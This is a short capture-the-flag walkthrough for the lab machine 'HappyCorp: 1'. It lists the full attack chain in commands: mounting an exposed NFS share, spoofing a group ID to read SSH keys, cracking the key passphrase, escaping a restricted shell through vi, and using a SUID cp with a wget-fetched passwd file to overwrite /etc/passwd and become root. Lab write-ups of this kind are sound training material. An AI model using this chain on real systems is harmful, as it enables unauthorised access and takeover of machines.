
# HappyCorp: 1

- 1- Let's started with scanning the target machine that reveals an important port open:
``` 2049 -> open -> NFS Share.```
- 2- Enumerating the shared files : ``` showmount -e 10.0.4.36 ```
- 3- Mounting the shared directory: ``` mount -t nfs 10.0.4.36:/home/karl /tmp/share ```
- 4- Go to the /tmp/share : ``` ls -al```: we can't access to .ssh directory
- 5- Create a group identifiant 1001: ``` groupadd -g 1001 mygroup```
- 6- Affecte my user account to the group created: ``` useradd -G mygroup root``` => we can access to .ssh shared file
- 7- Upload his private ssh key -> use ssh2john to retrieve the passphrase.
- 8- Connect with private ssh to rbash shell
- 9- Abuse vi to get out from the restricted bash: ``` vi -> :!/bin/sh```
- 10- ``` find / -perm -u=s -type f 2>/dev/null```
- 11- /bin/cp: can be runned as root user.
- 12- ```wget http://10.0.4.36:8000/passwd  -> cp passwd /etc/passwd -> su tbag (root user)```
- 13- boooooooooooooooooooom
